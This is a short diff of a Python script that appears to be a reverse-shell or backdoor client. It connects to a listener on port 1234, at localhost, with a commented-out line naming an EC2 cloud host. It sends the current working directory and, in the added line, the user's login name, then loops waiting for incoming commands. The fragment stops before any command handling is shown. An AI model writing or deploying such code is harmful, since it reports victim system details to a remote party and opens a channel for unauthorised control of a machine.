@@ -31,6 +31,7 @@ port = 1234
 #s.connect(('ec2-100-26-161-44.compute-1.amazonaws.com',port))
 s.connect(('127.0.0.1',port))
 s.send(os.getcwd().encode())
+s.send(os.getlogin().encode())
 while True:
     res = s.recv(2048).decode()
     res = res.lower()
